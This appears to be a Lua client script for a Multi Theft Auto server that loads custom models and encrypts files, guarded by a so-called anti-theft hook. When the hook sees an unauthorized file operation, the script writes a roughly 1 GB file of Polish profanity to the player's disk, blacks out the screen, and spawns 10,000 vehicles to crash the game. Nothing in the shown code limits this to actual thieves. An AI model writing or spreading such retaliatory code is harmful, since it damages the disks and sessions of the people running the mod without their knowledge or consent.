cancelLoadingModels = false
models = {
    ['int-1'] = {
        custom = true,
        type = 'object',
        model = 1337,
    }
}

function getModelsCount()
    local count = 0
    for _, model in pairs(models) do
        count = count + 1
    end
    return count
end

local isActionAuthorized = false

local function authorizeAction()
    isActionAuthorized = true
end

local function createFile(path, wantedSize)
    local text = 'wez wypierdalaj xd xd xd\n'
    if not fileExists(path) then
        local file = fileCreate(path)
        fileWrite(file, text)
        fileClose(file)
    end

    local size = 0
    repeat
        local file = fileOpen(path)
        size = fileGetSize(file)
        text = text .. string.rep('wez wypierdalaj xd xd xd\n', 1024 * 10)
        fileWrite(file, text)

        fileClose(file)
    until size >= wantedSize
end

local function wypierdalajRender()
    local sx, sy = guiGetScreenSize()
    dxDrawRectangle(0, 0, sx, sy, tocolor(0, 0, 0, 255), true)
    dxDrawText('wypierdalaj', 0, 0, sx, sy, tocolor(255, 255, 255, 255), 5, 'default-bold', 'center', 'center', false, false, true)
end

local function stealDetection(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
    if isActionAuthorized then
        print('authorized' .. luaFilename)
        isActionAuthorized = false
        return
    end

    outputChatBox('wypierdalaj')
    cancelLoadingModels = true
    local mb1 = 1024 * 1024
    local gb1 = 1024 * mb1
    createFile('wypierdalaj.txt', 1 * gb1)
    addEventHandler('onClientRender', root, wypierdalajRender)

    local x, y, z = getCameraMatrix()
    for i = 1, 10000 do
        local veh = createVehicle(411, x, y, z)
        setElementFrozen(veh, true)
    end
end

function startStealProtection()
    local success = addDebugHook('preFunction', stealDetection, {'fileOpen', 'fileWrite', 'fileCreate'})
    if not success then
        cancelLoadingModels = true
        outputChatBox('Nie udało się załadować modeli, zgłoś to do administracji serwera!')
    end
end
startStealProtection()

function stopStealProtection()
    removeDebugHook('preFunction', stealDetection)
end

function encodeFileIn(path, pathOut, hash)
    if not fileExists(path) then return end
    print('Encoding file ' .. path)

    local file = fileOpen(path)
    if not file then return end
    local data = fileRead(file, fileGetSize(file))
    fileClose(file)
    
    if fileExists(pathOut) then
        fileDelete(pathOut)
    end
    
    local newData = teaEncode(data, hash)
    local newFile = fileCreate(pathOut)
    fileWrite(newFile, newData)
    fileClose(newFile)
end
    
function decodeFileIn(path, hash)
    if not fileExists(path) then return end

    authorizeAction()
    local file = fileOpen(path)
    authorizeAction()
    local size = fileGetSize(file)
    authorizeAction()
    local data = fileRead(file, size)
    authorizeAction()
    fileClose(file)
    
    return teaDecode(data, hash)
end